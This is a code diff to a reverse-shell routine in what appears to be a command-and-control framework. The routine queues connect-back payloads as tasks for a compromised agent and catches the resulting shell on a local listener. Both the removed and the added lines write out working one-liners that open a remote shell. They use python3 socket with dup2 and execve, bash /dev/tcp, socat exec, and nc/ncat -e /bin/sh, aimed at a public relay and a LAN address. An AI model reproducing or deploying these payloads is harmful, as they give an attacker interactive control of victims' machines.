@@ -151,25 +151,18 @@ def revshell(manager, agent_id, c2_server):
 
     _write(f"{Fore.CYAN}[*] TCP listener on 0.0.0.0:{port}{Style.RESET_ALL}\n")
 
-    targets = [(PUBLIC_RS, "Cloudflare"), (LOCAL_IP, "LAN")]
+    # Fast TCP attempt: just try Python & bash on LAN IP (Cloudflare TCP likely blocked)
+    payloads = [
+        (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(8);s.connect(('{LOCAL_IP}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh','-i'],os.environ)\"", "python3 → LAN"),
+        (f"bash -c 'exec 3<>/dev/tcp/{LOCAL_IP}/{port}; cat <&3 | /bin/sh -i >&3 2>&3'", "bash /dev/tcp → LAN"),
+    ]
 
-    # Try each target with multiple connect-back methods
-    payloads = []
-    for host, label in targets:
-        payloads += [
-            (f"python3 -c \"import socket,os;s=socket.socket();s.settimeout(15);s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve('/bin/sh',['/bin/sh','-i'],os.environ)\"", f"python3 → {label}"),
-            (f"bash -c 'exec 3<>/dev/tcp/{host}/{port}; cat <&3 | /bin/sh -i >&3 2>&3'", f"bash → {label}"),
-            (f"echo 'import socket,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2));os.execve(\"/bin/sh\",[\"/bin/sh\",\"-i\"],os.environ)' | python3", f"echo-pipe → {label}"),
-            (f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}", f"socat → {label}"),
-            (f"nc {host} {port} -e /bin/sh 2>/dev/null || ncat {host} {port} -e /bin/sh 2>/dev/null || nc.traditional -e /bin/sh {host} {port} 2>/dev/null", f"nc → {label}"),
-        ]
-
-    srv.settimeout(3)
+    srv.settimeout(4)
     for payload, label in payloads:
         _send_task(manager, agent_id, payload, label)
-        for _ in range(4):
+        for _ in range(2):
             try:
-                srv.settimeout(3)
+                srv.settimeout(4)
                 conn, addr = srv.accept()
                 srv.close()
                 _pty_bridge(conn)
